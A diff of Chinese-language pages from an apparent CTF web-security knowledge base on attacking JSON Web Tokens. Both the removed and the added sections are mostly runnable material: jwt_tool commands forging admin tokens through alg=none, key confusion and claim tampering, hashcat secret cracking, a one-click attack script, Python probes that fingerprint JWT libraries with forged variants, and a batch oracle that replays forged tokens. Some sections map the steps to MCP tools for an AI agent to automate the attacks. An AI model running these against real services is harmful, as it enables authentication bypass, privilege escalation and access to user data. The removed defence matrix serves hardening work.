-| `cryptography` (Python) | JWK ↔ PEM 转换、算法验证 |
-| `jq` | JWKS JSON 解析 |
-| `curl` | HTTP 请求重放 |
-| `Burp Repeater` | 修改 Header/Payload 并发包 |
-| `ngrok` / `localtunnel` | 暴露本地 JWKS 用于 jku 测试 |
-
----
-
-## 2. 标准攻击流程
-
-### 阶段 1: 信息收集
-
-```bash
-# Step 1.1: 捕获合法 Token
-# - 浏览器 DevTools: Application → Cookies / Local Storage
-# - Burp Suite: Proxy → HTTP history → Authorization header
-# - 移动端: 代理抓包
-
-# Step 1.2: 解码分析
-python3 jwt_tool.py <token>
-# 输出:
-#   Header:  {"alg": "RS256", "typ": "JWT", "kid": "key-001"}
-#   Payload: {"sub": "12345", "role": "user", "exp": 1718123456, "iss": "auth.target.com"}
-
-# Step 1.3: 信息收集
-#   - 查看 /.well-known/jwks.json
-#   - 查看 /.well-known/openid-configuration
-#   - 指纹后端框架 (Server / X-Powered-By 头)
-#   - 识别 JWT 库版本（从错误信息）
+```text
+收集错误文本和依赖证据
+  → 跑 malformed / none / no-sig / nbf / aud / kid 变体
+  → 归类语言、库、版本或 key callback 分支
+  → 映射到 01-06 的具体技术线
+  → 用同一业务 oracle 证明身份、权限、数据或 flag 差异
 ```
 
-### 阶段 2: 漏洞扫描
+## 输入信号
 
-```bash
-# Step 2.1: 全自动 CVE 扫描
-python3 jwt_tool.py <token> -t https://target.com/api/me -cv "Welcome" -M pb
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 错误里出现 `secretOrPublicKey`, `jwt malformed`, `invalid signature` | 路由到 Node `jsonwebtoken` | 错误文本随 malformed/none/no-sig 变体变化 | 全部被网关统一成 `401` |
+| `Algorithm none is not allowed`, `InvalidAlgorithmError` | 路由到 PyJWT/python-jose | alg=none 被明确识别 | WAF/框架层直接拒绝 Authorization 格式 |
+| `Jwts.parser`, `JwtException`, `io.jsonwebtoken` | 路由到 Java jjwt | nbf/exp/alg 错误文本不同 | 只返回业务通用错误 |
+| `go-jose`, `square/go-jose`, `jwt-go` | 路由到 Go | none/crit/kid 解析差异可见 | 代理层吞掉错误 |
+| package lock / requirements / pom 泄露 | 直接抽库版本 | 版本落入历史 CVE 区间 | 版本新但业务代码自写 key callback |
+| OIDC/JWKS 元数据存在 | 判断 jku/kid/key rotation 路线 | kid 不存在时错误可区分 | kid 固定白名单 |
 
-# Step 2.2: 逐项测试
-python3 jwt_tool.py <token> -X n                 # alg: none
-python3 jwt_tool.py <token> -X k -pk public.pem  # key confusion
-python3 jwt_tool.py <token> -X i                 # kid injection
+## 0. CVE 路由矩阵
 
-# Step 2.3: 手动验证 Claim
-python3 jwt_tool.py <token> -I \
-  -pc "exp" -pv "9999999999" \
-  -pc "role" -pv "admin" \
-  -pc "sub" -pv "admin"
+| 路线 | 代表库/版本信号 | 关键变体 | 下一篇 |
+|---|---|---|---|
+| alg=none | python-jwt、python-jose、旧 jjwt、旧 php-jwt | 无签名、空签名、大小写 alg | `01-alg-none` |
+| RS/HS confusion | 接受 RS256 公钥，HS 分支未锁死 | 公钥 PEM/JWK/x5c 作 HMAC secret | `02-algorithm-confusion` |
+| weak HMAC | HS256 + 人类可读 secret | 字典、规则、环境名派生 | `03-weak-key-bruteforce` |
+| kid injection | `kid not found`、路径/SQL/命令回显 | traversal、SQLi、URL、空 key | `04-kid-injection` |
+| jku/x5u | header 中 key URL 被读取 | 自建 JWKS、host 绕过、kid 对齐 | `05-jku-x5u-abuse` |
+| claim parsing | aud/iss/exp/nbf/typ 错误可区分 | 缺失、数组/字符串、未来/过去 | `06-claim-missing` |
+| key callback | Node jsonwebtoken key lookup 可控 | null/undefined/object/key miss | 本篇 3.2 |
 
-# Step 2.4: 无签名测试
-# 直接解码→修改→重编码，不加签名
-# 如果 200 → 签名未验证
+## 1. 版本与库指纹
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import hashlib
+import json
+import requests
+
+def b64(obj):
+    raw = json.dumps(obj, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+def token(header, payload=None, sig="sig"):
+    payload = payload or {"sub": "probe", "iat": 1}
+    return ".".join([b64(header), b64(payload), sig])
+
+PROBES = {
+    "malformed": "abc.def.ghi",
+    "none_empty_sig": token({"alg": "none", "typ": "JWT"}, sig=""),
+    "none_with_sig": token({"alg": "none", "typ": "JWT"}, sig="x"),
+    "hs_no_sig": token({"alg": "HS256", "typ": "JWT"}, sig=""),
+    "rs_as_hs": token({"alg": "HS256", "typ": "JWT", "kid": "probe"}, sig="x"),
+    "future_nbf": token({"alg": "HS256", "typ": "JWT"}, {"sub": "probe", "nbf": 4102444800}, "x"),
+    "array_aud": token({"alg": "HS256", "typ": "JWT"}, {"sub": "probe", "aud": ["api", "admin"]}, "x"),
+}
+
+FINGERPRINTS = {
+    "secretOrPublicKey": "node-jsonwebtoken",
+    "jwt malformed": "node-jsonwebtoken",
+    "invalid token": "node-jsonwebtoken/express-jwt",
+    "InvalidAlgorithmError": "PyJWT",
+    "Algorithm none is not allowed": "PyJWT/python-jose",
+    "JWTClaimsError": "python-jose",
+    "io.jsonwebtoken": "jjwt",
+    "JwtException": "jjwt",
+    "Token is expired": "java/php/go jwt middleware",
+    "go-jose": "go-jose",
+}
+
+def hit(url, name, tok):
+    r = requests.get(url, headers={"Authorization": f"Bearer {tok}"}, timeout=10)
+    text = r.text[:1000]
+    libs = [lib for pat, lib in FINGERPRINTS.items() if pat.lower() in text.lower()]
+    return {
+        "case": name,
+        "status": r.status_code,
+        "hash": hashlib.sha256(r.text.encode(errors="ignore")).hexdigest()[:16],
+        "libs": sorted(set(libs)),
+        "sample": text[:180],
+    }
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    args = ap.parse_args()
+    for name, tok in PROBES.items():
+        print(json.dumps(hit(args.url, name, tok), ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-### 阶段 3: 密钥获取
+成功样本：不同变体产生不同错误文本，能定位库族或中间件。失败样本：所有变体同一 `401`、同一 body hash，说明错误被统一封装，需要换 API oracle 或读依赖文件。
 
-```bash
-# 路径 A: 公钥收集 (用于算法混淆)
-curl -s https://target.com/.well-known/jwks.json | jq .
-curl -s https://target.com/.well-known/openid-configuration | jq .jwks_uri
-openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout
+## 2. 依赖清单抽取
 
-# 路径 B: 弱密钥爆破 (用于 HMAC)
-hashcat -m 16500 jwt.txt rockyou.txt
-python3 jwt_tool.py <token> -C -d rockyou.txt
+| 文件 | 字段 | JWT 库关键词 |
+|---|---|---|
+| `package.json/package-lock.json/yarn.lock/pnpm-lock.yaml` | dependencies/version | `jsonwebtoken`, `express-jwt`, `jose`, `jwks-rsa` |
+| `requirements.txt/poetry.lock/Pipfile.lock` | package/version | `PyJWT`, `python-jose`, `authlib`, `jwt` |
+| `pom.xml/gradle.lockfile` | group/artifact/version | `io.jsonwebtoken`, `nimbus-jose-jwt`, `java-jwt` |
+| `composer.lock` | package/version | `firebase/php-jwt`, `lcobucci/jwt` |
+| `go.mod/go.sum` | module/version | `golang-jwt/jwt`, `square/go-jose`, `lestrrat-go/jwx` |
 
-# 路径 C: kid 注入获取密钥
-# → 详见 jwt-kid-injection.md
+```python
+#!/usr/bin/env python3
+import argparse
+import json
+import re
+from pathlib import Path
+
+PAT = re.compile(r"(?i)(jsonwebtoken|express-jwt|jwks-rsa|pyjwt|python-jose|authlib|io\.jsonwebtoken|nimbus-jose-jwt|java-jwt|firebase/php-jwt|lcobucci/jwt|golang-jwt/jwt|go-jose|lestrrat-go/jwx)[\"'=:/ @-]*([0-9][0-9A-Za-z._+-]*)?")
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("files", nargs="+")
+    args = ap.parse_args()
+    for file in args.files:
+        text = Path(file).read_text(encoding="utf-8", errors="ignore")
+        for m in PAT.finditer(text):
+            print(json.dumps({"file": file, "package": m.group(1), "version_hint": m.group(2) or "", "offset": m.start()}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-### 阶段 4: Token 伪造
+## 3. 重点 CVE 与实现分支
 
-```bash
-# 场景 A: 拿到 HMAC 密钥
-python3 jwt_tool.py <token> -S hs256 -k "cracked_secret" \
-  -I -pc "role" -pv "admin" -pc "sub" -pv "admin"
+### 3.1 none / confusion 历史类
 
-# 场景 B: 算法混淆 (用公钥做 HS256)
-python3 jwt_tool.py <token> -S hs256 -k public.pem \
-  -I -pc "role" -pv "admin"
+| 条件 | Payload | 命中样本 | 失败样本 |
+|---|---|---|---|
+| 旧库接受 `none` | `{"alg":"none"}` + 空签名 | 改 `sub/role` 被接受 | 明确 `none not allowed` |
+| alg 大小写/空白处理弱 | `NoNe`, `none `, `NONE` | 错误位置变化或被接受 | 全部归一化拒绝 |
+| RS/HS confusion | 公钥作 HS256 secret | forged token 进业务 | 算法白名单固定 |
 
-# 场景 C: 自建 JWKS (jku 劫持)
-python3 jwt_tool.py <token> -X i -pk attacker_private.pem
+这类不要在本篇重复展开，直接按矩阵转对应文件，用同一业务 oracle 收敛。
 
-# 场景 D: alg=none
-python3 jwt_tool.py <token> -X n -I -pc "role" -pv "admin"
+### 3.2 Node key callback / key miss 路线
+
+`jsonwebtoken` 的很多题面不是库本身裸漏洞，而是业务把 `kid/tenant/iss` 接到 key lookup，key miss 后进入异常分支。重点测：
+
+| 变体 | 操作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `kid` 不存在 | `kid=missing` | 错误文本出现 key callback/key value | 固定 `kid not found` |
+| `kid=null/undefined` | JSON null、空字符串、数组 | 进入不同错误 hash | schema 拒绝 |
+| tenant 切换 | `iss/aud/tenant` 指向低权限租户 | 高权限 API 接受低租户 key | issuer/audience mismatch |
+| object pollution | header claim 为对象/数组 | JS 类型错误或异常分支 | JSON schema 固定字符串 |
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+
+def enc(o):
+    return base64.urlsafe_b64encode(json.dumps(o, separators=(",", ":")).encode()).rstrip(b"=").decode()
+
+def make(header, payload):
+    return f"{enc(header)}.{enc(payload)}.x"
+
+HEADERS = [
+    {"alg": "HS256", "typ": "JWT", "kid": ""},
+    {"alg": "HS256", "typ": "JWT", "kid": "missing"},
+    {"alg": "HS256", "typ": "JWT", "kid": None},
+    {"alg": "HS256", "typ": "JWT", "kid": ["missing"]},
+    {"alg": "HS256", "typ": "JWT", "kid": {"toString": "missing"}},
+]
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--sub", default="probe")
+    args = ap.parse_args()
+    for i, h in enumerate(HEADERS):
+        print(json.dumps({"case": f"key_callback_{i}", "token": make(h, {"sub": args.sub, "iat": 1})}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-### 阶段 5: 验证与利用
+## 4. CVE 证据判定
 
-```bash
-# 验证伪造的 Token
-curl -v https://target.com/api/admin \
-  -H "Authorization: Bearer <forged_token>"
+| 证据强度 | 说明 |
+|---|---|
+| 强 | 依赖文件给出库和版本，payload 让业务 oracle 发生身份/权限/flag 差异 |
+| 中 | 错误文本高度指向库族，payload 推进到不同 handler，但还缺版本文件 |
+| 弱 | 只有响应头框架猜测，payload 全部同一错误 |
+| 冲突 | 版本看似受影响，但业务固定算法/key/claim，CVE 路线不成立 |
 
-# 如果是管理后台 Cookie:
-curl -v https://target.com/admin/dashboard \
-  -H "Cookie: jwt=<forged_token>"
+## 5. Evidence
 
-# 批量测试
-while read url; do
-  echo "[*] Testing $url"
-  curl -s -o /dev/null -w "%{http_code}" "$url" \
-    -H "Authorization: Bearer $TOKEN"
-  echo ""
-done < endpoints.txt
-```
-
----
-
-## 3. 一键工作流脚本
-
-```bash
-#!/bin/bash
-# jwt_attack_workflow.sh — JWT 攻击一键工作流
-# Usage: ./jwt_attack_workflow.sh <token> <target_url>
-
-TOKEN="$1"
-TARGET="$2"
-OUTDIR="jwt_attack_$(date +%Y%m%d_%H%M%S)"
-mkdir -p "$OUTDIR"
-
-echo "[*] Phase 1: Decode"
-python3 jwt_tool.py "$TOKEN" | tee "$OUTDIR/01_decode.txt"
-
-echo "[*] Phase 2: Scan"
-python3 jwt_tool.py "$TOKEN" -t "$TARGET" -M pb 2>&1 | tee "$OUTDIR/02_scan.txt"
-
-echo "[*] Phase 3: alg=none"
-python3 jwt_tool.py "$TOKEN" -X n 2>&1 | tee "$OUTDIR/03_alg_none.txt"
-
-echo "[*] Phase 4: weak key brute"
-python3 jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt 2>&1 | tee "$OUTDIR/04_brute.txt"
-
-echo "[*] Phase 5: claim bypass"
-python3 jwt_tool.py "$TOKEN" -I -pc "exp" -pv "9999999999" 2>&1 | tee "$OUTDIR/05_exp.txt"
-python3 jwt_tool.py "$TOKEN" -I -pc "role" -pv "admin" 2>&1 | tee "$OUTDIR/05_role.txt"
-
-echo "[*] Phase 6: check JWKS"
-curl -s "$TARGET/.well-known/jwks.json" | tee "$OUTDIR/06_jwks.json"
-curl -s "$TARGET/.well-known/openid-configuration" | tee "$OUTDIR/06_oidc.json"
-
-echo "[*] Done. Results in $OUTDIR/"
-```
-
----
-
-## 4. 证据收集模板
-
-每次测试必须记录：
-
-```markdown
-## JWT 测试证据
-
-### 原始 Token
-```
-eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0wMDEifQ...
-```
-
-### 解码结果
-- Header:  `{"alg":"RS256","typ":"JWT","kid":"key-001"}`
-- Payload: `{"sub":"12345","role":"user","exp":1718123456}`
-- 签发者:  `auth.target.com`
-
-### 测试记录
-
-| # | 测试类型 | 修改项 | 发送的 Token (前50字符) | HTTP 状态 | 结果 |
-|---|---------|--------|------------------------|-----------|------|
-| 1 | alg:none | alg→none, role→admin | eyJhbGciOiJub25lIn0... | 200 | ✓ 绕过 |
-| 2 | Claim | exp→9999999999 | ... | 200 | ✓ 未验证过期 |
-| 3 | 弱密钥 | 未修改 (爆破) | ... | N/A | ✗ 密钥强度足够 |
-
-### 成功攻击的完整请求
-```http
-GET /api/admin/users HTTP/1.1
-Host: target.com
-Authorization: Bearer eyJhbGciOiJub25lIn0...
-```
-
-### 成功攻击的响应
-```json
-{"users": [...], "admin_panel": true}
-```
-
-### 影响
-- 权限提升：user → admin
-- 可访问的管理接口：/api/admin/users, /api/admin/settings
-- 可操作的数据：所有用户 PII
-
-### 工具与命令
-```bash
-python3 jwt_tool.py <original> -X n -I -pc "role" -pv "admin"
-```
-```
-
----
-
-## 5. 对抗矩阵
-
-### 服务端
-
-| 层面 | 错误做法 | 正确做法 |
-|------|---------|---------|
-| **算法** | 信任 Header 中的 `alg` | 固定白名单：`["RS256"]` 或 `["ES256"]` |
-| **none** | 未显式禁用 | `algorithms` 列表中不含 `none` |
-| **密钥类型** | HS256（对称） | RS256/ES256（非对称），密钥不共享 |
-| **HMAC 密钥** | 短密码、字典词 | 256-bit CSPRNG 随机值，存环境变量 |
-| **公钥获取** | 信任 Header 的 `jku` / `x5u` | 从本地配置或白名单 URL 获取 |
-| **kid** | 直接拼接到路径/查询/命令 | 仅做 key→value 映射查询 |
-| **exp 验证** | 不检查 | 必须验证，且误差窗口 ≤ 5 min |
-| **nbf 验证** | 不检查 | 必须验证 |
-| **iss 验证** | 不检查 | 必须白名单匹配 |
-| **aud 验证** | 不检查 | 必须匹配当前服务标识 |
-| **typ 验证** | 不区分 Token 类型 | Access Token 不接受 ID Token |
-| **jti 验证** | 不生成/不验证 | 生成唯一 jti，维护使用记录 |
-| **撤销** | 无机制 | Redis 黑名单 + jti 检查 |
-| **有效期** | > 24h | Access Token ≤ 15 min，Refresh Token 可更长 |
-| **库版本** | 不更新 | 保持最新 stable，订阅安全公告 |
-
-### 客户端（前端/移动端）
-
-| 层面 | 错误做法 | 正确做法 |
-|------|---------|---------|
-| **存储** | `localStorage` / `sessionStorage` | `httpOnly` + `Secure` + `SameSite=Strict` Cookie |
-| **传输** | URL 参数 | Authorization Header 或 Cookie |
-| **HTTPS** | HTTP 明文 | 强制 HTTPS + HSTS |
-| **Logout** | 仅前端删除 Token | 调服务端 `/revoke` 端点 |
-
-### 传输与基础设施
-
-| 层面 | 措施 |
-|------|------|
-| TLS | ≥ 1.2，禁用弱密码套件 |
-| HSTS | `max-age=31536000; includeSubDomains; preload` |
-| Referrer-Policy | `strict-origin` 或 `no-referrer` |
-| CORS | 严格限制 Origin，不反射 `Access-Control-Allow-Origin` |
-| 日志 | 不记录 Authorization header |
-| WAF | 检测异常 JWT（alg:none、超长 exp 等） |
-
----
-
-## 参考
-
-- [RFC 8725: JWT Best Current Practices](https://www.rfc-editor.org/rfc/rfc8725.html)
-- [OWASP: JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
-- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
-- [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
-- [IANA JWT Claims Registry](https://www.iana.org/assignments/jwt/jwt.xhtml)
+| 项 | 记录内容 |
+|---|---|
+| 指纹输入 | HTTP 响应头、错误文本、依赖清单路径、OIDC/JWKS URL |
+| 版本证据 | package 名、版本号、lockfile 行号、容器/源码路径 |
+| payload 变体 | malformed、none、no-sig、future nbf、array aud、kid miss 等 |
+| oracle | 每个变体的 `status/body_hash/error_text/handler` |
+| 成功样本 | CVE 路由后的 token 被业务接口接受，产生身份、权限、数据或 flag 差异 |
+| 失败样本 | 版本不受影响、算法固定、key lookup 固定、claim 校验稳定拒绝 |
+| 下一跳 | 按路由矩阵转 `01-06` 对应文件，避免在 CVE 页重复跑全链 |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 知识路由 | `kb_router` | 按库名、CVE、错误文本搜索 |
+| HTTP 指纹 | `http_probe` | 发送固定 token 变体并记录响应 |
+| 依赖读取 | `kb_read_file` | 结合仓库内 CVE/依赖路线复核 |
 
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| 对抗措施验证 | `http_probe` | HTTP GET 探测验证 JWT 对抗配置 |
-| jwt_tool 工具检查 | `ctf_tool_status` | 检查 CTF 工具安装状态 |
+
+---
+## [ctf-website] JWT 工具链、操作流程与结果矩阵
+### JWT Toolchain, Operations Workflow, and Result Matrix
+URL: https://ling71671.github.io/open-reverselab/kb/ctf-website/02-auth/jwt/09-toolchain-operations/
+Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/techniques/02-auth/jwt/09-toolchain-operations.md
+
+> >
+
+# JWT 工具链、操作流程与结果矩阵
+
+本篇是 JWT 子目录的执行层：拿到 token 后，先解码和定向路由，再用最少变体打同一业务 oracle。不要让工具“全自动扫一遍”替代判断；每个命中都必须能解释是哪个校验被穿透。
+
+## 输入信号
+
+| 信号 | 工具优先级 | 下一跳 |
+|---|---|---|
+| `alg=none` 或无签名 token | `jwt_tool -X n` + 手工空签名变体 | `01-alg-none` |
+| `RS256/ES256` + 可取公钥 | PEM/JWK 提取 + HS 重签 | `02-algorithm-confusion` |
+| `HS256/HS384/HS512` | hashcat `-m 16500` + 规则字典 | `03-weak-key-bruteforce` |
+| `kid` 存在 | traversal/SQL/URL/空 key 变体 | `04-kid-injection` |
+| `jku/x5u/x5c` 存在 | 自建 JWKS + kid 对齐 | `05-jku-x5u-abuse` |
+| `exp/aud/iss/typ/scope` 可疑 | claim 单变量突变 | `06-claim-missing` |
+| 错误文本暴露库 | 指纹脚本 + 版本路由 | `08-cve-library` |
+
+## 0. 五阶段流程
+
+```text
+捕获 token
+  → 解码 header/claims
+  → 路由到最可能的 1-2 条技术线
+  → 生成单变量 token 变体
+  → 对同一业务 oracle 批量验证
+  → 输出 Evidence 和下一跳
+```
+
+## 1. 工具组合
+
+| 工具 | 用途 | 输出 |
+|---|---|---|
+| `jwt_tool.py` | 解码、none、kid、claim 修改、常见攻击模块 | token 变体、扫描日志 |
+| `hashcat -m 16500` | HMAC secret 爆破 | secret、hashcat potfile |
+| `jwt-cracker` | CPU 快速扫短 secret | secret 候选 |
+| Burp JWT Editor | 手工改 header/claim、重放 | Repeater 证据 |
+| `openssl` | RSA/EC 公钥、证书、x5c 处理 | PEM/JWK 互转材料 |
+| Python `pyjwt/cryptography` | 自定义批量生成 | JSONL payload 集 |
+| `curl/httpie` | 固定 oracle | 状态码、响应 hash、业务字段 |
+
+## 2. token 快速路由器
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+
+def dec(part):
+    part += "=" * (-len(part) % 4)
+    return json.loads(base64.urlsafe_b64decode(part.encode()))
+
+def route(header, payload):
+    alg = (header.get("alg") or "").upper()
+    out = []
+    if alg == "NONE" or not header.get("alg"):
+        out.append("01-alg-none")
+    if alg.startswith("RS") or alg.startswith("ES"):
+        out.append("02-algorithm-confusion")
+    if alg.startswith("HS"):
+        out.append("03-weak-key-bruteforce")
+    if "kid" in header:
+        out.append("04-kid-injection")
+    if any(k in header for k in ("jku", "x5u", "x5c")):
+        out.append("05-jku-x5u-abuse")
+    if any(k not in payload for k in ("exp", "iss", "aud")) or payload.get("typ") in ("id", "id_token"):
+        out.append("06-claim-missing")
+    return out or ["08-cve-library"]
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("token")
+    args = ap.parse_args()
+    h, p, *_ = args.token.split(".")
+    header, payload = dec(h), dec(p)
+    print(json.dumps({"header": header, "payload": payload, "routes": route(header, payload)}, ensure_ascii=False, indent=2))
+
+if __name__ == "__main__":
+    main()
+```
+
+## 3. 批量 oracle
+
+将工具生成的 token 保存为 JSONL，每行格式：`{"case":"alg_none_role_admin","token":"..."}`。oracle 只做一件事：固定同一个业务接口，记录可比较结果。
+
+```python
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
+from pathlib import Path
+import requests
+
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def read_jsonl(path):
+    for line in Path(path).read_text(encoding="utf-8").splitlines():
+        if line.strip():
+            yield json.loads(line)
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True)
+    ap.add_argument("--tokens", required=True)
+    ap.add_argument("--cookie", default="")
+    ap.add_argument("--header", action="append", default=[])
+    args = ap.parse_args()
+    base_headers = {}
+    if args.cookie:
+        base_headers["Cookie"] = args.cookie
+    for item in args.header:
+        k, v = item.split(":", 1)
+        base_headers[k.strip()] = v.strip()
+    for item in read_jsonl(args.tokens):
+        headers = dict(base_headers)
+        headers["Authorization"] = f"Bearer {item['token']}"
+        r = requests.get(args.url, headers=headers, timeout=10)
+        try:
+            body = r.json()
+        except Exception:
+            body = {"raw": r.text[:300]}
+        print(json.dumps({
+            "case": item["case"],
+            "status": r.status_code,
+            "hash": h(r.text),
+            "location": r.headers.get("Location", ""),
+            "user": body.get("user", body.get("sub", "")) if isinstance(body, dict) else "",
+            "role": body.get("role", body.get("scope", "")) if isinstance(body, dict) else "",
+            "flag_hit": any(s in r.text for s in ("flag{", "CTF{", "DASCTF{")),
+        }, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+判定矩阵：
+
+| 差异 | 解释 |
+|---|---|
+| `status/hash/user/role` 全变 | token 变体进入业务逻辑 |
+| status 相同但 hash 变 | 可能进入不同错误分支，继续看错误文本 |
+| 全部同 hash | 当前路线未穿透，换 oracle 或下一条路线 |
+| `flag_hit=true` | 固定完整请求/响应，回填 Evidence |
+
+## 4. payload 组织规范
+
+```json
+{"case":"baseline","route":"00-overview","token":"<original>"}
+{"case":"alg_none_role_admin","route":"01-alg-none","token":"<variant>"}
+{"case":"rs_public_as_hs","route":"02-algorithm-confusion","token":"<variant>"}
+{"case":"kid_traversal_devnull","route":"04-kid-injection","token":"<variant>"}
+{"case":"claim_aud_missing","route":"06-claim-missing","token":"<variant>"}
+```
+
+每个 case 名必须包含路线和变量，不要只写 `test1/test2`。
+
+## 5. 命令速查
+
+```bash
+# 解码
+python3 jwt_tool.py "$TOKEN"
+
+# none
+python3 jwt_tool.py "$TOKEN" -X n -I -pc role -pv admin
+
+# HMAC secret
+hashcat -m 16500 jwt.txt rockyou.txt
+python3 jwt_tool.py "$TOKEN" -C -d rockyou.txt
+
+# claim 单变量
+python3 jwt_tool.py "$TOKEN" -I -pc exp -pv 9999999999
+python3 jwt_tool.py "$TOKEN" -I -pc role -pv admin
+
+# JWKS/OIDC
+curl -s https://target.example/.well-known/openid-configuration
+curl -s https://target.example/.well-known/jwks.json
+```
+
+## 6. Evidence
+
+| 项 | 记录内容 |
+|---|---|
+| 原始 token | header/payload、来源、获取时间、业务 oracle |
+| 路由理由 | alg/kid/jku/claim/错误文本/库版本等触发信号 |
+| payload 集 | JSONL case、token 前缀、路线、单变量说明 |
+| oracle 结果 | `status/hash/location/user/role/flag_hit` |
+| 成功样本 | 伪造 token 触发身份、权限、数据、订单、flag 差异 |
+| 失败样本 | 同一错误 hash、签名错误、claim 错误、key not found、token expired |
+| 下一跳 | 命中的路线文件、需要补的公钥/secret/JWKS/日志证据 |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 路由 | `kb_router` | 按 alg/kid/jku/claim/CVE 信号找文件 |
+| 工具状态 | `ctf_tool_status` | 检查 jwt_tool/hashcat 等是否可用 |
+| HTTP oracle | `http_probe` | 固定 header 和响应 hash 批量验证 |
 
 
 ---
